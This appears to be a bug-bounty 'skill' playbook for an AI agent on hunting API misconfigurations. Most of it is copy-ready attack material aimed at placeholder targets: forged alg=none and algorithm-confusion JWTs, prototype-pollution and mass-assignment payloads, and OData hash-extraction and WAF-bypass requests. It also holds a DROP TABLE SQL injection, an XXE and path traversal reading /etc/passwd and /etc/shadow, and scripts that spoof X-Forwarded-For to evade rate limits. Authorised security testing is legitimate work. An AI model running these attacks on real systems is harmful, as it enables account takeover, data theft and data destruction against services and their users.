---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks, prototype pollution, HTTP verb tampering. Mass assignment: send {is_admin:true, role:admin, verified:true} on profile/account/reset endpoints — server blindly applies. JWT: alg=none, weak HMAC bruteforce, kid path traversal, JWK injection, token confusion. Prototype pollution: __proto__ injection in JSON merge / Object.assign / lodash _.merge → polluted prototype reaches sink (RCE in Node, XSS in browser). HTTP verb: GET-bypass-CSRF, X-HTTP-Method-Override, TRACE enabled. Detection: API responses with extra fields, JWTs in headers (decode at jwt.io). CORS misconfiguration (reflect-any-origin, null origin, subdomain-regex bypass, postMessage) is owned by hunt-cors. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution."
sources: field_recon, hackerone_public, portswigger_research
report_count: 24
---

## 12. API SECURITY MISCONFIGURATION

### Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```

### JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

### JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

### Prototype Pollution
```javascript
// Server-side — Node.js merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

### CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

---

## OData $filter / $select / $expand WAF-Blacklist Bypass (2024-2026 surface)

OData (Open Data Protocol) is the query layer behind **SharePoint, Microsoft Dynamics 365 / Power Platform, SAP NetWeaver Gateway / Fiori,** and any ASP.NET WebAPI project using `Microsoft.AspNetCore.OData`. It exposes SQL-shaped query operators (`eq`, `ne`, `and`, `or`, `substringof`, `startswith`, `tolower`, `concat`, `replace`) that look SQL-ish but are NOT SQL — meaning keyword-blacklist WAFs routinely fail open on OData traffic.

### Attack class 1 — Boolean-logic blind extraction via `startswith` / `substringof`

```
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'a')
GET /_api/data/contacts?$filter=startswith(adx_identity_passwordhash,'aa')
```

Iterate prefix character-by-character; cardinality of the response (or `@odata.count`) is the boolean oracle that confirms the prefix is correct. No SQLi engine needed, no `'`/`--` characters — the WAF sees only legitimate OData keywords. Extracted Microsoft Dynamics 365 / Power Apps Portals **password hashes, names, emails, addresses, financial data** in Dec 2023; Microsoft patched May 2024. ([Stratus Security writeup](https://www.stratussecurity.com/post/critical-microsoft-365-vulnerability), [The Hacker News coverage Jan 2025](https://thehackernews.com/2025/01/severe-security-flaws-patched-in.html))

### Attack class 2 — `$orderby` / `$select` column-disclosure bypass

```
GET /api/data/v9.0/contacts?$orderby=emailaddress1 desc&$select=fullname
```

`$orderby` accepts column names the user has no `$select` permission for, but the engine still sorts on them — the returned order leaks the protected column. Column-level ACLs are enforced on the projection (`$select`) but NOT on `$orderby` / `$filter` — same protected column, different code path. Second Stratus finding in the same Dynamics 365 disclosure; "more dangerous than the first because it directly returned the data" per Stratus.

### Attack class 3 — `$batch` multipart/mixed → per-request WAF signatures miss sub-operations

```
POST /odata/$batch  Content-Type: multipart/mixed; boundary=batch_1
--batch_1
Content-Type: application/http
GET Users?$filter=1 eq 1 HTTP/1.1
--batch_1--
```

WAFs that scan only the outer request body (or that don't natively parse `multipart/mixed`) skip every inner operation. ModSecurity refused `multipart/mixed` historically ([Issue #3296](https://github.com/owasp-modsecurity/ModSecurity/issues/3296)); F5 added native batch parsing only in Advanced WAF v16.1 ([F5 SAP-Fiori advisory](https://www.f5.com/company/blog/securing-sap-fiori-http-batched-requests-odata-with-f5-advance)). The 2025 WAFFLED paper ([arXiv 2503.10846](https://arxiv.org/html/2503.10846v1)) generalises the parsing-discrepancy bypass class across 5 major WAFs.

### Attack class 4 — Encoded / non-canonical operator → keyword-blacklist bypass

```
GET /api?%24filter=Name%20eq%20'x'%20or%201%20eq%201   # URL-encoded $
GET /api?%2524filter=...                                # double-encoded
GET /Users(1)/$value                                    # path-segment style
```

Mixed-case operators (`Eq`, `EQ`) and obscure ones (`substringof`, `tolower`, `concat`, `replace`) look unlike `SELECT`/`UNION` so SQLi-keyword signatures never fire. WAFs that key on the literal string `$filter` see neither form — but the OData server normalises both before evaluating the predicate. Documented since Kalra Black Hat AD 2012; canonical OData-vs-WAF impedance mismatch. ([OWASP Double Encoding](https://owasp.org/www-community/Double_Encoding))

### Attack class 5 — OData → real SQLi when library passes filter raw

```
$filter=Name eq 'x'); DROP TABLE Users--'
```

Only triggers when the OData layer string-concatenates into SQL instead of using LINQ. Documented in [OData/WebApi Issue #2352](https://github.com/OData/WebApi/issues/2352). The XML-deserialisation variant: **CVE-2019-17554** (Apache Olingo OData 4.0.0-4.6.0, XXE via `<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]>` in `application/xml` body, CVSS 7.5). DoS variant: **CVE-2018-8269** (Microsoft.Data.OData deep `$filter` recursion → stack overflow).

### Bonus — `$expand` navigation-property IDOR

```
GET /Orders?$expand=Customer($expand=PaymentMethods($expand=Card))
```

Authorisation decorators applied to top-level entity sets; the engine joins along navigation properties without re-checking ACL on the joined entity. Same root cause as the 2021 PowerApps Portals 38M-record mass leak ([UpGuard writeup](https://www.upguard.com/breaches/power-apps)).

### Detection heuristics

- Response headers: `OData-Version: 4.0` / `DataServiceVersion: 3.0`; URL paths `/_api/`, `/odata/`, `/_vti_bin/`, `/api/data/v9.x/`, `/sap/opu/odata/`.
- Try `$metadata` → if anonymous, the full schema (entity sets, navigation properties, function imports) is yours.
- Probe each entity set with `$filter=1 eq 1`, `$top=1`, `$select=*`, then `$orderby=<column-you-shouldnt-see>` for column-level ACL.
- Send the same payload three ways (`$filter=`, `%24filter=`, `%2524filter=`) and through `$batch` — divergent WAF behaviour confirms the parser-discrepancy bug.

---

## NSwag / Swagger / OpenAPI Spec Exposure (2024-2026 surface)

NSwag is the Swagger/OpenAPI toolchain for ASP.NET Core. Default routes (`/swagger`, `/swagger/v1/swagger.json`, `/swagger/index.html`) ship enabled in many .NET 6/7/8 projects and developers leave them on in production. The exposed spec discloses every endpoint, HTTP methods, parameter names + types + formats + max-lengths, models, validation rules — a complete attack-map in JSON.

### Default discovery paths (cross-references `web2-recon`)

```
# NSwag / Swashbuckle (ASP.NET Core)
/swagger, /swagger/index.html, /swagger/v1/swagger.json, /swagger/v2/swagger.json, /swagger/v3/swagger.json
/swagger-ui, /swagger-ui/, /swagger-ui.html, /api-docs
/nswag, /nswag/index.html, /api/swagger, /api/swagger.json, /api/openapi.json

# Generic OpenAPI
/openapi, /openapi.json, /openapi.yaml, /.well-known/openapi.json

# Java / Spring (Springfox / springdoc)
/v2/api-docs, /v3/api-docs, /v3/api-docs.yaml, /swagger-resources

# Python (FastAPI / Connexion)
/docs, /redoc, /openapi.json

# Quarkus
/q/openapi, /q/swagger-ui

# GraphQL adjacent
/graphql, /graphiql, /playground, /altair, /voyager
```

Tools: `kiterunner` natively eats OpenAPI; `sj` (Swagger Jacker), `apidetector`, `XSSwagger`.

### Attack chains

**A. Spec disclosure → mass IDOR / BOLA.** Spec lists every `GET /api/v1/users/{userId}/...`. `jq '.paths | keys' swagger.json` → swap `{userId}` for victim's ID via Autorize/`ffuf -mc 200`. Common case: spec leaks `/api/admin/users/{id}/reset-password` documented but missing `[Authorize(Roles="Admin")]` on the controller — low-priv ATO.

**B. Spec disclosure → mass-assignment payload construction.** `components.schemas.UserUpdateDto` enumerates every model field including `isAdmin`, `emailVerified`, `tenantId`, `role`. Attacker copies the schema verbatim into `PATCH /users/me` and adds the privileged fields. Server's `[FromBody]` binder accepts them when DTOs aren't split into read-vs-write models.

**C. Hidden endpoints.** Specs document `/internal/*`, `/debug/*`, `/v0/*`, `/legacy/*` routes that no front-end UI references. Reachable but uncovered by WAF rules and often skipped during auth reviews.

**D. Swagger UI configUrl takeover.** Swagger UI loads its config from `?configUrl=`. If unsanitised, attacker hosts an evil OpenAPI spec, sends victim a link to the *legitimate* Swagger UI with `?configUrl=https://evil/spec.json`. Spec routes point back at the legitimate origin so the victim's "Try It Out" clicks fire same-origin authenticated requests. ([HackerOne #3124103 — U.S. DoD Swagger UI Injection, May 2025](https://hackerone.com/reports/3124103))

### Disclosed cases

- **CVE-2018-25031** — Swagger UI ≤ 4.1.2 spec-injection via URL parameter; affects org.webjars:swagger-ui broadly (embedded in Swashbuckle and NSwag bundles).
- **Swagger UI DOM XSS (3.14.1 → 3.38.0)** — outdated bundled DOMPurify + remote-spec-load → arbitrary JS in victim browser ([Vidoc Security Lab writeup](https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers), [PortSwigger Daily Swig](https://portswigger.net/daily-swig/widespread-swagger-ui-library-vulnerability-leads-to-dom-xss-attacks)). Reported live on PayPal, Atlassian, Microsoft, GitLab, Yahoo.
- **HackerOne #3124103** — U.S. Department of Defense, Swagger UI Injection (May 2025).
- **HackerOne #2534300** — Ionity GmbH, HTML injection in Swagger UI.
- **HackerOne #1656650** — Reflected XSS via Swagger UI `url=` parameter.
- **CloudSEK threat-intel (2024)** — actors abuse exposed `swagger-ui` to invoke a verified-business WhatsApp send-message endpoint, impersonating the company to its customers. 6,000+ exposed Swagger UI instances on Shodan at time of writing. ([CloudSEK report](https://www.cloudsek.com/threatintelligence/threat-actors-use-exposed-swagger-ui-to-misuse-a-companys-endpoints-and-target-customers))
- **CVE-2023-38337** — `rswag` (Ruby Swagger toolchain) directory traversal — reminder that the spec endpoint is itself an attack surface.

### Detection checklist

1. httpx-probe every path above across the full subdomain set; flag 200 with `Content-Type: application/json` AND body matching `"swagger"` or `"openapi"`.
2. For every hit: `jq '.paths | keys' swagger.json` → feed to kiterunner / Autorize.
3. `jq '.components.schemas' swagger.json` → mass-assignment field candidates.
4. Banner the Swagger UI HTML for version string; map to the CVE-2018-25031 / DOM-XSS table.
5. Test `?configUrl=` and `?url=` parameter handling on every Swagger UI hit.

## Shadow API Discovery

Shadow APIs are undocumented, forgotten, or decommissioned API endpoints that remain accessible.
They often lack authentication, rate limiting, or security reviews.

### Discovery methods:

**A. Common shadow API paths**
```bash
# Probe commonly forgotten endpoints:
for path in \
  /api/swagger.json /api/v1/docs /api/v2/docs /api/v3/docs \
  /graphql /graphiql /playground /altair /voyager \
  /internal /internal/api /internal/health /internal/debug \
  /debug /debug/api /debug/health /debug/pprof \
  /api/health /api/status /api/ping /api/version \
  /api/v0 /api/legacy /api/old /api/beta /api/dev /api/test \
  /api/admin /api/internal /api/partner /api/vendor \
  /.env /.env.example /config.json /settings.json /configuration \
  /api/.env /api/config /api/settings \
  /actuator /actuator/health /actuator/info /actuator/env \
  /api-docs /api-docs.json /api-docs.yaml \
  /openapi.json /openapi.yaml; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [[ "$code" != "404" && "$code" != "000" ]] && echo "$code $path"
done
```

**B. Version enumeration (version-gap discovery)**
```bash
# The current app uses /api/v2 — test v1, v3, v4, v0:
for v in v0 v1 v2 v3 v4 v5 beta dev staging; do
  curl -s -o /dev/null -w "%{http_code} " "https://target.com/api/$v/users"
  echo "/api/$v/users"
done
```

**C. HTTP method enumeration on discovered endpoints**
```bash
# For each discovered path, test all HTTP methods:
curl -X OPTIONS -s -D- "https://target.com/api/some-endpoint" 2>/dev/null | grep -i allow
# Also test: PATCH, PUT, POST, DELETE, CONNECT, TRACE, HEAD
```

**D. GraphQL introspection as shadow API discovery**
```bash
# Even if /graphql is known, its schema may reveal undocumented mutations/fields:
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name fields { name } } } }"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('\n'.join(t['name'] for t in d.get('data',{}).get('__schema',{}).get('types',[]) if not t['name'].startswith('__')))" \
  | grep -iE "admin|internal|debug|test|secret|token|key|migrate|backup|reset|bypass|override|dev|beta"
```

### Attack chains:
- Shadow API + no auth = all endpoints accessible without authentication
- Shadow API + weaker auth = IDOR / privilege escalation via undocumented parameters
- Shadow API + debug mode = stack traces, source maps, connection strings
- GraphQL shadow field = mutation that resets user passwords or escalates privileges

## Rate Limit Bypass via Aliases

Rate limiting is meaningless if a single request can carry N logical operations. Three proven bypasses:

### A. HTTP/2 Stream Multiplexing
```bash
# Open single HTTP/2 connection, send N requests on N streams in one TCP write.
# Server's rate limiter counts per-TCP-connection, not per-stream — all N pass.
curl --http2 -s --parallel --parallel-max 30 \
  -H "Cookie: session=xxx" \
  -w "%{http_code}\n" -o /dev/null \
  "https://target.com/api/endpoint?param={1..30}"
```

### B. Batch Operation Abuse
Many APIs support batch operations that accept arrays:
```bash
# Instead of 1 item per request (rate-limited at 10/min), batch 100 items in 1 request:
curl -X POST "https://target.com/api/users/batch" \
  -H "Content-Type: application/json" \
  -d '{"users": [{"email": "user1@test.com"}, {"email": "user2@test.com"}, ...]}'
# If batch endpoint uses a separate rate limit or no limit → bypass
```

### C. API Key Rotation
```bash
# Register multiple API keys / accounts, rotate across them:
for key in "key1" "key2" "key3" "key4" "key5"; do
  curl -s -H "X-API-Key: *** "https://target.com/api/resource"
done
# For JWT-based APIs, request multiple short-lived tokens from different sessions
```

### D. X-Forwarded-For IP rotation
```bash
# If rate limiter keys on client IP from X-Forwarded-For:
for ip in $(seq 1 50); do
  curl -s -H "X-Forwarded-For: 10.0.0.$ip" "https://target.com/api/resource" &
done
wait
```

### E. GraphQL alias-based batching (N operations in 1 request)
```bash
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { '"$(for i in $(seq 1 100); do echo -n "a$i: user(id:$i) { email } "; done)"' }"}'
# 100 data-fetch operations in a single request bypasses per-request rate limits
```

## API Parameter Pollution

Injecting duplicate, conflicting, or unexpected parameters to bypass validation or alter behavior.

### A. HTTP Parameter Pollution (HPP)
```bash
# Duplicate params — server may accept first, last, or concatenate:
curl "https://target.com/api/users?id=1&id=2&id=3"
curl "https://target.com/api/users?id=1&id=2&role=user&role=admin"
# Test different separators:
curl "https://target.com/api/users?id=1&id=2"  # standard
curl "https://target.com/api/users?id[]=1&id[]=2"  # PHP array syntax
curl "https://target.com/api/users[?id=1,2]"  # Rails array
```

### B. JSON Parameter Pollution
```bash
# Duplicate keys in JSON — server may use last value:
curl -X PUT "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@company.com","email":"attacker@evil.com","role":"user","role":"admin"}'

# Nested parameter injection:
curl -X PUT "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","settings":{"role":"admin"},"role":"admin"}'
```

### C. HTTP Method Override
```bash
# Bypass method-level ACLs by overriding:
curl -X GET "https://target.com/api/admin/users" \
  -H "X-HTTP-Method: DELETE" \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "X-Method-Override: DELETE"

# POST with overridden method:
curl -X POST "https://target.com/api/admin/users" \
  -H "X-HTTP-Method-Override: DELETE"
```

### D. Content-Type Confusion
```bash
# Send JSON payload with URL-encoded Content-Type:
curl -X POST "https://target.com/api/user/update" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d '{"role":"admin","is_admin":true}'
# Some parsers accept JSON content from form-urlencoded type

# XML injection via alternative Content-Type:
curl -X POST "https://target.com/api/user/update" \
  -H "Content-Type: application/xml" \
  -d '<user><role>admin</role><is_admin>true</is_admin></user>'
```

### E. Path traversal via parameter pollution
```bash
# API that constructs file paths from user parameters:
curl "https://target.com/api/export?format=pdf&format=../../etc/passwd"
curl "https://target.com/api/template?name=report&name=../../../etc/shadow"
```

### Detection script:
```bash
# Quick pollution probe across discovered endpoints:
for endpoint in /api/users /api/profile /api/admin /api/v2/users; do
  for pollute in \
    "?id=1&id=2" \
    "?role=user&role=admin" \
    "?email=victim@test.com&email=attacker@evil.com"; do
    resp1=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$pollute")
    resp2=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$endpoint$(echo $pollute | cut -d'&' -f1)")
    [[ "$resp1" != "$resp2" ]] && echo "POLLUTION SENSITIVE: $endpoint $pollute → $resp1 vs single → $resp2"
  done
done
```

---

## Related Skills & Chains

- **`hunt-ato`** — Mass assignment on signup/profile is the fastest path to admin. Chain primitive: API mass assignment + `hunt-ato` → `role=admin` set on signup → ATO via privileged role on first login.
- **`hunt-auth-bypass`** — JWT flaws collapse the entire auth layer. Chain primitive: JWT `alg=none` + `hunt-auth-bypass` → impersonate any user by setting `sub` to victim ID, no signature required.
- **`hunt-rce`** — Prototype pollution gadgets in Node.js dependencies (lodash, mongoose, jQuery) reach `child_process.spawn`. Chain primitive: Prototype pollution (`__proto__.shell=true`) + `hunt-rce` (Node.js gadget chain) → RCE on the API node.
- **`hunt-subdomain`** — CORS regex with wildcard subdomain trusts a takeoverable host. Chain primitive: CORS allowlist `*.target.com` + subdomain takeover → attacker-controlled origin reads credentialed API responses.
- **`security-arsenal`** — Load the JWT Attack Payloads section (alg=none, kid path traversal, JWK injection, embedded JWK) and the Mass-Assignment Field Wordlist (`is_admin`, `role`, `verified`, `permissions`, `org_id`, `tenant_id`).
- **`triage-validation`** — Apply the Server-Policy-vs-State gate: a permissive CORS header alone is informational; demonstrate actual cross-origin credentialed read of sensitive data before reporting.

